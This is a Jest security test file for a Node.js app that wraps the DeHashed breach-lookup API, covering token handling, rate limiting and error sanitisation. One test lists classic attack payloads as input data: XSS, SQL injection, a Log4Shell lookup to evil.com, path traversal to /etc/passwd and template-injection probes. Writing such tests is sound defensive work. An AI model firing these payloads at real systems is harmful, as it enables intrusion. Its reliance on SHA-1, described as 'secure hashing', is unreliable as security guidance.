/**
 * Security Tests
 * 
 * These tests validate security measures and potential vulnerabilities
 */

const AuthService = require('../../src/services/AuthService');
const DeHashedService = require('../../src/services/DeHashedService');
const ErrorHandler = require('../../src/utils/ErrorHandler');
const { userRateLimit } = require('../../src/middleware/auth');

describe('Security Tests', () => {

  describe('Authentication Security', () => {
    let authService;

    beforeEach(() => {
      authService = new AuthService();
    });

    it('should properly validate JWT tokens', () => {
      // Test with valid token structure
      const validPayload = {
        sub: '123',
        email: 'test@example.com',
        exp: Math.floor(Date.now() / 1000) + 3600
      };
      const encodedPayload = Buffer.from(JSON.stringify(validPayload)).toString('base64');
      const validToken = `header.${encodedPayload}.signature`;

      const user = authService.extractUserFromToken(validToken);
      expect(user).toBeDefined();
      expect(user.id).toBe('123');
      expect(user.email).toBe('test@example.com');
    });

    it('should reject malformed JWT tokens', () => {
      const malformedTokens = [
        'invalid.token',
        'header.invalid-base64.signature',
        'header..signature',
        '',
        null,
        undefined
      ];

      malformedTokens.forEach(token => {
        const user = authService.extractUserFromToken(token);
        expect(user).toBeNull();
      });
    });

    it('should detect expired tokens', () => {
      const expiredPayload = {
        sub: '123',
        exp: Math.floor(Date.now() / 1000) - 3600 // 1 hour ago
      };
      const encodedPayload = Buffer.from(JSON.stringify(expiredPayload)).toString('base64');
      const expiredToken = `header.${encodedPayload}.signature`;

      const isExpired = authService.isTokenExpired(expiredToken);
      expect(isExpired).toBe(true);
    });

    it('should handle Bearer token prefix securely', () => {
      const payload = { sub: '123', exp: Math.floor(Date.now() / 1000) + 3600 };
      const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
      const tokenWithBearer = `Bearer header.${encodedPayload}.signature`;

      const user = authService.extractUserFromToken(tokenWithBearer);
      expect(user).toBeDefined();
      expect(user.id).toBe('123');
    });

    it('should format auth errors without exposing sensitive information', () => {
      const sensitiveError = {
        message: 'Database connection failed: password=secret123',
        stack: 'Error at /path/to/sensitive/file.js:123'
      };

      const formatted = authService.formatAuthError(sensitiveError);
      
      // Should not expose the original sensitive message in production
      expect(formatted.message).toBeDefined();
      expect(formatted.code).toBeDefined();
      
      // In development, details might be included, but should be controlled
      if (process.env.NODE_ENV === 'development') {
        expect(formatted.details).toBeDefined();
      }
    });
  });

  describe('Password Security', () => {
    let dehashedService;

    beforeEach(() => {
      dehashedService = new DeHashedService('test-key');
    });

    it('should hash passwords before sending to API', async () => {
      const crypto = require('crypto');
      const testPassword = 'testpassword123';
      const expectedHash = crypto.createHash('sha1').update(testPassword).digest('hex').toUpperCase();

      // Mock the searchByHash method to verify the hash is used
      const searchSpy = jest.spyOn(dehashedService, 'searchByHash').mockResolvedValue({
        found: false,
        breachCount: 0,
        breaches: []
      });

      try {
        await dehashedService.checkPassword(testPassword);
        expect(searchSpy).toHaveBeenCalledWith(expectedHash);
      } catch (error) {
        // Expected in test environment without real API
      }

      searchSpy.mockRestore();
    });

    it('should validate password input securely', async () => {
      const invalidInputs = [
        null,
        undefined,
        123,
        {},
        [],
        '',
        'a'.repeat(201) // Too long
      ];

      for (const input of invalidInputs) {
        try {
          await dehashedService.checkPassword(input);
          fail('Should have thrown an error for invalid input');
        } catch (error) {
          expect(error.message).toContain('Password is required');
        }
      }
    });

    it('should not log actual passwords', () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
      const errorSpy = jest.spyOn(console, 'error').mockImplementation(() => {});

      const testPassword = 'secretpassword123';
      
      // Simulate password strength analysis (which shouldn't log the password)
      dehashedService.analyzePasswordStrength(testPassword);

      // Check that the actual password wasn't logged
      const logCalls = consoleSpy.mock.calls.flat();
      const errorCalls = errorSpy.mock.calls.flat();
      
      logCalls.forEach(call => {
        expect(call).not.toContain(testPassword);
      });
      
      errorCalls.forEach(call => {
        expect(call).not.toContain(testPassword);
      });

      consoleSpy.mockRestore();
      errorSpy.mockRestore();
    });
  });

  describe('Rate Limiting Security', () => {
    it('should implement rate limiting middleware', () => {
      const rateLimitMiddleware = userRateLimit(5, 60000); // 5 requests per minute
      expect(typeof rateLimitMiddleware).toBe('function');
    });

    it('should track requests by user ID when authenticated', () => {
      const rateLimitMiddleware = userRateLimit(2, 60000);
      const mockReq = {
        user: { id: 'user123' },
        ip: '127.0.0.1'
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      // First request should pass
      rateLimitMiddleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();
      expect(mockRes.status).not.toHaveBeenCalledWith(429);

      // Reset mocks
      mockNext.mockClear();
      mockRes.status.mockClear();

      // Second request should pass
      rateLimitMiddleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();
      expect(mockRes.status).not.toHaveBeenCalledWith(429);

      // Reset mocks
      mockNext.mockClear();
      mockRes.status.mockClear();

      // Third request should be rate limited
      rateLimitMiddleware(mockReq, mockRes, mockNext);
      expect(mockNext).not.toHaveBeenCalled();
      expect(mockRes.status).toHaveBeenCalledWith(429);
    });

    it('should fall back to IP-based rate limiting for unauthenticated users', () => {
      const rateLimitMiddleware = userRateLimit(1, 60000);
      const mockReq = {
        ip: '127.0.0.1'
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      // First request should pass
      rateLimitMiddleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();

      // Reset mocks
      mockNext.mockClear();
      mockRes.status.mockClear();

      // Second request should be rate limited
      rateLimitMiddleware(mockReq, mockRes, mockNext);
      expect(mockNext).not.toHaveBeenCalled();
      expect(mockRes.status).toHaveBeenCalledWith(429);
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not expose sensitive information in error responses', () => {
      const sensitiveError = {
        message: 'Database connection failed',
        stack: 'Error at /home/user/app/database.js:123\n    at Connection.connect (/home/user/app/node_modules/mysql/lib/Connection.js:456)',
        config: {
          password: 'secret123',
          apiKey: 'sk-1234567890abcdef'
        }
      };

      const { response } = ErrorHandler.formatErrorResponse(sensitiveError);

      // Should not expose stack traces in production
      if (process.env.NODE_ENV !== 'development') {
        expect(response.error.details).toBeUndefined();
      }

      // Should never expose config or sensitive data
      expect(JSON.stringify(response)).not.toContain('secret123');
      expect(JSON.stringify(response)).not.toContain('sk-1234567890abcdef');
      expect(JSON.stringify(response)).not.toContain('/home/user/app');
    });

    it('should sanitize API error responses', () => {
      const apiError = {
        response: {
          status: 401,
          data: {
            error: 'Invalid API key: sk-1234567890abcdef',
            details: {
              apiKey: 'sk-1234567890abcdef',
              endpoint: '/internal/admin/users'
            }
          }
        }
      };

      const errorResponse = ErrorHandler.handleAPIError(apiError, 'ExternalAPI');

      // Should not expose API keys or internal endpoints
      const responseStr = JSON.stringify(errorResponse);
      expect(responseStr).not.toContain('sk-1234567890abcdef');
      expect(responseStr).not.toContain('/internal/admin');
    });
  });

  describe('Input Validation Security', () => {
    it('should validate and sanitize user inputs', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'javascript:alert(1)',
        '{{7*7}}',
        '<%=7*7%>',
        '#{7*7}'
      ];

      maliciousInputs.forEach(input => {
        // Test that error handler doesn't execute or reflect malicious input
        const error = { message: input };
        const { response } = ErrorHandler.formatErrorResponse(error);
        
        // Should not contain the exact malicious input
        expect(response.error.message).not.toBe(input);
        
        // Should be a generic error message
        expect(response.error.message).toBe('Внутренняя ошибка сервера');
      });
    });

    it('should handle extremely long inputs safely', () => {
      const longInput = 'A'.repeat(10000);
      const error = { message: longInput };
      
      const { response } = ErrorHandler.formatErrorResponse(error);
      
      // Should not crash and should provide a reasonable response
      expect(response).toBeDefined();
      expect(response.error).toBeDefined();
      expect(response.error.message).toBeDefined();
    });
  });

  describe('Cryptographic Security', () => {
    it('should use secure hashing for passwords', () => {
      const crypto = require('crypto');
      const testPassword = 'testpassword';
      
      // Verify SHA-1 is used (as required by DeHashed API)
      const hash1 = crypto.createHash('sha1').update(testPassword).digest('hex');
      const hash2 = crypto.createHash('sha1').update(testPassword).digest('hex');
      
      expect(hash1).toBe(hash2); // Consistent hashing
      expect(hash1).toHaveLength(40); // SHA-1 produces 40 character hex string
      expect(hash1).toMatch(/^[a-f0-9]{40}$/); // Valid hex format
    });

    it('should generate cryptographically secure request IDs', () => {
      const requestIds = [];
      
      // Generate multiple request IDs
      for (let i = 0; i < 100; i++) {
        const id = ErrorHandler.generateRequestId();
        requestIds.push(id);
        
        // Should be reasonably long
        expect(id.length).toBeGreaterThan(10);
        
        // Should contain only safe characters
        expect(id).toMatch(/^[a-z0-9]+$/);
      }
      
      // Should be unique
      const uniqueIds = new Set(requestIds);
      expect(uniqueIds.size).toBe(requestIds.length);
    });
  });
});